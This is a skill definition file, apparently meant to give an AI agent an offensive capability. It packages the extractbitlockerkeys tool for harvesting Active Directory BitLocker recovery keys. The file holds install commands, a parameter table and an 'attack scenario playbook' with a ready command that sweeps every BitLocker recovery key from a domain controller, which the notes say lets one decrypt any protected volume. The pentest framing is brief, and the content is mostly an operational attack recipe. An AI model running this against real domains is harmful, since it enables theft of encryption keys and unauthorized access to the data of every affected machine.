---
name: extractbitlockerkeys-dpapi
description: "extractbitlockerkeys: domain BitLocker key harvesting. Signals: AD attack, domain penetration, show hosts with keys only, CSV output."
zh-signals: "extractbitlockerkeys: 域内 BitLocker 密钥收割。信号:ad攻击,域渗透,只显示有密钥的主机,CSV 输出。"
when-to-use: >-
  Use during Active Directory penetration testing when you have domain
  credentials and want to harvest all BitLocker recovery keys backed up to AD;
  supports filtering hosts with keys and CSV output.
---

# extractbitlockerkeys

- Attack Category: C30 AD and Lateral Movement
- Upstream Repository: https://github.com/p0dalirius/extractbitlockerkeys
- Upstream License: GPL-2.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/p0dalirius/extractbitlockerkeys && cd extractbitlockerkeys && pip install -r requirements.txt
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python3 extractbitlockerkeys.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1` | Harvest BitLocker recovery keys across the domain |
| `-q` | Show only hosts that have keys |
| `-csv` | CSV output |

## Attack Scenario Playbook

### Domain-wide BitLocker key harvest

```bash
python3 extractbitlockerkeys.py -u svc -p pass -d corp.local -dc-ip 10.0.0.1
# Sweeps up every BitLocker recovery key backed up to AD
```

## Notes

From p0dalirius; extracts the BitLocker recovery keys backed up to AD from every host in bulk, letting you decrypt any BitLocker-protected volume.
